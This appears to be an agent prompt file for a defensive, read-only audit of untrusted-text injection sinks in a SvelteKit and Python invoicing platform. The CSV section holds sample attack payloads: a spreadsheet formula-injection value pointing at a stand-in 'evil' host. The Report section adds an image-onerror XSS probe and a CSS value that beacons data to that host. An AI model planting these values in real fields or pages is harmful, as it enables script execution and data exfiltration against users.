---
description: Audit every path where untrusted text becomes markup, CSS, a CSV cell, or an email body — Svelte `{@html}`, server-rendered HTML pages, brand CSS custom properties, spreadsheet formula injection
---

Find every place text this platform did not author is rendered as something other than inert text, and verify it is escaped, sanitised, or shape-validated.

## Goal

The frontend is a **static** SvelteKit site with no SSR, and Svelte escapes `{value}` by default — so the classic reflected-XSS surface is small. The risk here is the *other* injection sinks an AP platform accumulates, all fed by text that a supplier, an OCR model, or a co-tenant admin controls:

- an invoice's vendor name, description, or line items — extracted from a PDF a **supplier** uploaded;
- supplier-chat message bodies and `@mention` tokens — written by a **vendor user** outside our trust boundary;
- LLM output from the assistant / cash-flow copilot — a model's response to an attacker-influenced document;
- white-label brand values (`accent`, `accent_strong`, `logo_url`, product name) — set by a tenant admin, applied to `document.documentElement.style` as CSS custom properties, and served **unauthenticated** on the public portal branding route;
- the server-rendered HTML the backend does emit (the public email-approval confirm page, the `/api/v1/docs` reference);
- exports — CSV cells opened in Excel, and PDF text.

## What to check

1. **Svelte `{@html}` — should be zero.** `grep -rn "{@html" frontend/src`. Today every hit is a *comment* saying never to use it (in `SupplierChatThread.svelte`, `ChatMessage.svelte`, `CopilotChatMessage.svelte`, `InvoiceModal.svelte`). A real `{@html}` on any of those paths is a **High** — those are exactly the vendor-authored and model-authored strings. If one is genuinely needed, it needs a sanitiser, not a review.

2. **The `@mention` renderer.** `frontend/src/lib/components/chat/SupplierChatThread.svelte` highlights known members *without* `{@html}` — it tokenises and binds each piece as text. Confirm any change to that renderer keeps the token/bind structure; the moment it concatenates a string and hands it to `{@html}`, a vendor-controlled message body is a script vector.

3. **Dynamic `href` / `src`.** `grep -rn "href={\|src={" frontend/src --include=*.svelte`. Trace each source. A tenant-supplied `logo_url` or a vendor-supplied website URL rendered into `href`/`src` must reject `javascript:` and `data:` schemes. The branding API validates http(s) on write — confirm the client does not trust a value that predates that validation or arrives from the public portal route.

4. **Brand values as CSS.** `frontend/src/lib/stores/brand.svelte.ts` and `portalBrand.svelte.ts` write brand colours into CSS custom properties via `root.style.setProperty`. A custom property is not HTML, but an unvalidated value still escapes its declaration (`red; background: url(...)`) and can exfiltrate via a CSS request or overlay the page. Confirm the hex-colour validation in `/api/organization/branding` is mirrored (or re-applied) client-side, and that the **public, unauthenticated** `GET /api/portal/branding` returns only the whitelisted fields.

5. **Server-rendered HTML.** Two routes emit HTML, both **public-by-design**:
   - `backend/app/api/email_actions.py` — the email-approval confirm page. Every interpolation must go through `html.escape` (the current `_page` / `_info_page` / `_confirm_page` helpers do; check any new one).
   - `backend/app/api/v1_openapi.py::public_docs` — the `/api/v1/docs` reference, rendered server-side from live routes precisely because the platform's `default-src 'none'` CSP blocks Swagger's CDN assets. It has its own escape helper — confirm every field of the generated spec (route summaries, schema field names) passes through it.
   Neither may gain a `<script>` or an external asset: that would either break under the CSP or force a CSP relaxation, which is the real regression.

6. **Spreadsheet formula injection.** Any cell beginning `=`, `+`, `-`, `@`, tab or CR is executed as a formula by Excel and Sheets. The platform already owns this: `backend/app/services/report_export.py::csv_safe_cell` / `safe_csv_writer`. Grep for every `csv.writer(` / `csv.DictWriter(` / manual `",".join(` under `backend/app/` and confirm each goes through the safe wrapper — analytics exports, the report builder, scheduled reports, the DSAR bundle, expense exports, Positive Pay files. A vendor name of `=HYPERLINK("http://evil","click")` reaching a CFO's spreadsheet is the live scenario. A raw `csv.writer` on an export path is **High**.

7. **Email bodies.** `backend/app/services/notification_dispatch.py` + `services/email_adapters/`. Notification content is meant to be PII-free (invoice number, vendor, amount, status, deep link). Confirm any HTML-bodied mail escapes interpolated vendor/invoice text, and that the deep link is built from `FEOH_API_PUBLIC_URL` / the tenant host rather than a value that arrived in the request.

8. **The chat-notification adapters.** `services/chat_notification_adapters/` posts Slack Block Kit and Teams MessageCards containing a vendor name. Confirm text lands in a text field rather than a markdown/HTML block that would let a vendor name forge a button or a link in someone else's Slack.

## Report

- **High** — vendor-, model-, or co-tenant-controlled text reaches the DOM as HTML, a CSS declaration, or an unescaped server-rendered page. Give the payload that proves it (`<img src=x onerror=alert(1)>` as a vendor name; `red;background:url(//evil/?c=` as an accent colour).
- **High** — an export path bypassing `safe_csv_writer`.
- **Medium** — escaping present but bypassable, an `href`/`src` scheme check that accepts a borderline value, or a CSP relaxation introduced to make a rendering path work.
- **Low** — correct today but structured so the next edit reintroduces the sink (a helper that returns sometimes-HTML, sometimes-text).

For each: `file:line`, the origin of the untrusted text (which actor controls it), the sink, and the missing escape.

## Useful starting points

- `frontend/src/lib/components/chat/SupplierChatThread.svelte` — vendor-authored message bodies + `@mention` tokenising
- `frontend/src/lib/components/assistant/ChatMessage.svelte`, `.../cash-flow/CopilotChatMessage.svelte` — model output
- `frontend/src/lib/stores/brand.svelte.ts`, `portalBrand.svelte.ts` — brand values → CSS custom properties
- `backend/app/api/email_actions.py`, `backend/app/api/v1_openapi.py` — the two server-rendered HTML routes
- `backend/app/services/report_export.py` — `csv_safe_cell` / `safe_csv_writer`, the formula-injection guard
- `backend/app/api/organization.py` — brand hex + URL validation on write
- `docs/white-label.md`, `docs/decisions.md` §39 (why `/api/v1/docs` is hand-rendered, not Swagger)

## Delegate to

Use the `repo-security-auditor` agent: `"Audit every path where untrusted text becomes markup, CSS, a CSV cell or an email body — Svelte {@html}, the @mention renderer, brand CSS custom properties, the two server-rendered HTML routes, and CSV formula injection on every export."`

Read-only. Report findings; don't patch without confirmation.
